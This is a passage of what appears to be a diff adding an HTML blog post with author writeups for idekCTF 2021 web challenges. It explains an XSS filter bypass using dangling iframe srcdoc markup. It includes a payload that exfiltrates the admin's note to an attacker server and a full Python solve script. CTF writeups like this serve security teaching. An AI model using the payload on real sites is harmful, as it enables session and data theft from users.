+        flash<span class="token punctuation">(</span>msg<span class="token punctuation">)</span></code></pre></div>
+<p>How can we achieve xss without any of these strings? Because we can specify an <code class="language-text">error</code> message on the page of our notes, we can combine the our input sources for xss by utilizing an unclosed iframe <code class="language-text">srcdoc</code>.</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/677a6e04b5c4ee57d6ab3f269cbb1e34/47aef/iframe.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 38.60759493670886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAgklEQVQY06XLywrCMBCF4byiFzCZlGrqQp8+i2TSCZj0CCkutIqFfhyYzfyqv9z7802TM9ZRdzV2oDZjB03uRE6T2x+73cEup1IzNvNNr4nI+EY+pvDbowHAzDnn5cP3eJqmuUkpAfDeM/PaOMYYQqgNgBCjiKyNa62lFPyjsMGm+Anx7rPfSAfsUwAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="iframe with arbitrary HTML"
+        title="iframe with arbitrary HTML"
+        src="/static/677a6e04b5c4ee57d6ab3f269cbb1e34/f058b/iframe.png"
+        srcset="/static/677a6e04b5c4ee57d6ab3f269cbb1e34/c26ae/iframe.png 158w,
+/static/677a6e04b5c4ee57d6ab3f269cbb1e34/6bdcf/iframe.png 315w,
+/static/677a6e04b5c4ee57d6ab3f269cbb1e34/f058b/iframe.png 630w,
+/static/677a6e04b5c4ee57d6ab3f269cbb1e34/40601/iframe.png 945w,
+/static/677a6e04b5c4ee57d6ab3f269cbb1e34/47aef/iframe.png 1063w"
+        sizes="(max-width: 630px) 100vw, 630px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+  </a>
+    </span></p>
+<p>This works because the <code class="language-text">srcdoc</code> attribute does not close until another <code class="language-text">"</code> character is encountered on the page, which isn’t until <em>after</em> our paste content. Although our paste content is sanitized, it is still parsed as raw HTML when inside a <code class="language-text">srcdoc</code> attribute. Therefore, in combining our input sources, we can create an iframe with any HTML to bypass the filter.</p>
+<p>We can create a paste with content <code class="language-text">&lt;script>alert(document.domain)&lt;/script></code>. When the paste is accessed with <code class="language-text">?error=iframe%20srcdoc="</code>, our javascript is executed.</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/24c9507dfa6b55dc0c16dd62d403e782/6937a/alert.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 50.632911392405056%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABFElEQVQoz33OzU6DQBQFYF7IlSuNAhqTCtSVXVWgra26c1/UgOVHaGKbFugdhmEGfFIjk2gtpcmXyZ3kntwjDIaPw9GTOXgwzIlh8vePbox1c3Kn3/f7oyaB0ZIWjNKSNZSsKtkXo1VJq3reJQBgBBg2GOAfBPlisfoIoiSGeiFrEjKUt0lTFK9TBLhtYU8Y1V245vdQGGeE5EWOC5LTgnCMIzk9FMYZidebdyfw3OjtdWZN7RfL4ayp7dj+znFhu21BmO9F151bReldyF1J1DhZ6p6ddm7UXhIDzgiClrDnhpKoypImniuSqP6QtMuTqyPj+dgH+FxiXOwJ89ppAp4bBv7c96JfgRvO5ktvBWiTbdf+Bs1eQ+rxJmemAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="alert"
+        title="alert"
+        src="/static/24c9507dfa6b55dc0c16dd62d403e782/f058b/alert.png"
+        srcset="/static/24c9507dfa6b55dc0c16dd62d403e782/c26ae/alert.png 158w,
+/static/24c9507dfa6b55dc0c16dd62d403e782/6bdcf/alert.png 315w,
+/static/24c9507dfa6b55dc0c16dd62d403e782/f058b/alert.png 630w,
+/static/24c9507dfa6b55dc0c16dd62d403e782/40601/alert.png 945w,
+/static/24c9507dfa6b55dc0c16dd62d403e782/6937a/alert.png 1094w"
+        sizes="(max-width: 630px) 100vw, 630px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+  </a>
+    </span></p>
+<p>Then, we use our XSS to exfiltrate the admin’s note to our server.</p>
+<div class="gatsby-highlight" data-language="html"><pre class="language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+	<span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"/pastes/flag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span><span class="token operator">=></span>r<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">t</span><span class="token operator">=></span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://&lt;attacker-server>/extract?data=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token punctuation">{</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token function">btoa</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre></div>
+<p>Here is a full solve script which was used as a healthcheck during the challenge:</p>
+<div class="gatsby-highlight" data-language="py"><pre class="language-py"><code class="language-py"><span class="token comment">#!/usr/bin/env python3</span>
+
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> random
+<span class="token keyword">import</span> string
+<span class="token keyword">import</span> base64
+<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+username <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+password <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+l <span class="token operator">=</span> listen<span class="token punctuation">(</span><span class="token punctuation">)</span>
+vuln_url <span class="token operator">=</span> <span class="token string">"http://localhost:1337"</span>
+local_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://localhost:</span><span class="token interpolation"><span class="token punctuation">{</span>l<span class="token punctuation">.</span>lport<span class="token punctuation">}</span></span><span class="token string">"</span></span>
+session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>vuln_url<span class="token punctuation">)</span>
+
+exploit_html <span class="token operator">=</span> <span class="token triple-quoted-string string">"""\
+        &lt;script>
+            fetch("/pastes/flag").then(r=>r.text().then(t=>document.location=`{}/extract?data=${{encodeURIComponent(btoa(t))}}`))
+        &lt;/script>
+        """</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>local_url<span class="token punctuation">)</span>
+
+exploit_post <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">"title"</span><span class="token punctuation">:</span> <span class="token string">"exploit"</span><span class="token punctuation">,</span>
+        <span class="token string">"content"</span><span class="token punctuation">:</span> exploit_html
+        <span class="token punctuation">}</span>
+
+dangling_markup <span class="token operator">=</span> <span class="token string">'?error=&lt;iframe srcdoc="'</span>
+
+<span class="token comment"># register &amp; login</span>
+user_data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"downgrade"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">}</span>
+session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>vuln_url <span class="token operator">+</span> <span class="token string">"/register"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>user_data<span class="token punctuation">)</span>
+session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>vuln_url <span class="token operator">+</span> <span class="token string">"/login"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>user_data<span class="token punctuation">)</span>
+
+<span class="token comment"># upload exploit</span>
+r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>vuln_url <span class="token operator">+</span> <span class="token string">"/create"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>exploit_post<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+exploit_location <span class="token operator">=</span> r<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Location'</span><span class="token punctuation">]</span>
+
+<span class="token comment"># report to admin</span>
+session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>vuln_url <span class="token operator">+</span> <span class="token string">"/report"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"url"</span><span class="token punctuation">:</span> exploit_location <span class="token operator">+</span> dangling_markup<span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+_ <span class="token operator">=</span> l<span class="token punctuation">.</span>wait_for_connection<span class="token punctuation">(</span><span class="token punctuation">)</span>
+data_raw <span class="token operator">=</span> l<span class="token punctuation">.</span>readuntil<span class="token punctuation">(</span><span class="token string">'HTTP/1.1'</span><span class="token punctuation">)</span>
+data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>data_raw<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'data='</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># lol</span>
+
+<span class="token keyword">if</span> <span class="token string">b'idek{'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
+    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre></div>
+<h1 id="steghide-as-a-service" style="position:relative;"><a href="#steghide-as-a-service" aria-label="steghide as a service permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>steghide as a service</h1>
+<p>i don’t have time to write a full writeup at the moment, but I highly recommend reading <a href="https://twitter.com/NeptunianHacks">Neptunian</a>’s writeup, <a href="https://fireshellsecurity.team/idekctf-writeups/#steghide-as-a-service">here</a>. It is incredibly well written, as are all of their writeups.</p></section><hr/><footer></footer></article><nav class="blog-post-nav"><ul style="display:flex;flex-wrap:wrap;justify-content:space-between;list-style:none;padding:0"></ul></nav></main><footer>© <!-- -->2022<!-- -->, Built with<!-- --> <!-- --><a href="https://www.gatsbyjs.com">Gatsby</a></footer></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/idekctf-2021-web-author-writeups/";window.___webpackCompilationHash="f8c1bb2530b9f9f1986e";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"polyfill":["/polyfill-67664a8ccc6c9f02b880.js"],"app":["/app-7e1e5aafcabdd6a816a6.js"],"component---src-pages-404-js":["/component---src-pages-404-js-2325086e664690bad014.js"],"component---src-pages-about-js":["/component---src-pages-about-js-d8e55aadf821b4e98f83.js"],"component---src-pages-index-js":["/component---src-pages-index-js-291c53b1cf947ccd3574.js"],"component---src-pages-using-typescript-tsx":["/component---src-pages-using-typescript-tsx-10c44cecea137ee2685b.js"],"component---src-templates-blog-post-js":["/component---src-templates-blog-post-js-83735933c71ed5d93d45.js"]};/*]]>*/</script><script src="/polyfill-67664a8ccc6c9f02b880.js" nomodule=""></script><script src="/app-7e1e5aafcabdd6a816a6.js" async=""></script><script src="/framework-a90df563a3fe4f48300d.js" async=""></script><script src="/webpack-runtime-f931e673f43b96d8ae7f.js" async=""></script></body></html>
